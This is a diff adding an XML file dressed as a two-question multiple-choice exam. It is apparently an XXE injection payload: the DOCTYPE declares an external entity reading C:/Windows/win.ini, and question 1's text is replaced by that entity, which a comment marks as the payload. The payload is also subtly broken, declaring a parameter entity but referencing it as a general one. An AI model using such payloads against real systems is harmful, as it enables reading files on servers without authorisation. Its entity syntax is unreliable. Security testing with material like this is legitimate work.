@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % payload SYSTEM "file:///C:/Windows/win.ini">
+]>
+<exam>
+    <question>
+        <number>1</number>
+        <text>&payload;</text> <!-- Reference the payload entity here -->
+        <options>
+            <option>A. London</option>
+            <option>B. Paris</option>
+            <option>C. Rome</option>
+            <option>D. Berlin</option>
+        </options>
+        <answer>B</answer>
+    </question>
+    <question>
+        <number>2</number>
+        <text>Which planet is closest to the sun?</text>
+        <options>
+            <option>A. Earth</option>
+            <option>B. Venus</option>
+            <option>C. Mars</option>
+            <option>D. Mercury</option>
+        </options>
+        <answer>D</answer>
+    </question>
+</exam>
